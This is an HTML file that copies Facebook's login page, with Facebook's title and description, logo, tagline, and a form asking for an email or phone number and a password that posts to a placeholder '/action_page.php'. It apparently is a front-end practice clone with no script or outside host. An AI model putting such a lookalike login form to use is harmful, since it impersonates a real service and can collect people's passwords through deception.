<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
    <title>Facebook - login or sign up</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <div><img src="imgs/4lCu2zih0ca.svg" alt=""></div>
            <p>
                Facebook helps you connect and share <br>
                 with the people in your life.
            </p>
        </div>
        <div class="form">
            <form action="/action_page.php" method="post" novalidate target="_blank">
                <input class="user-id" type="text" required autofocus name="username" maxlength="15" placeholder="Email address or phone number">
                <input class="user-pass" type="password" required name="password" maxlength="30" placeholder="Password">
                <input class="log-button" type="submit" value="Log in">
                <a class="pass-reset" href="">Forgotten password?</a>
                <hr>
                <div class="new-account"><a href="signform.html" target="">Create new account</a></div>
            </form>
            <div class="footer"><p><a href="">Create a Page</a> for a celebrity, brand or business.</p></div>
        </div>
    </div>
</body>
</html>
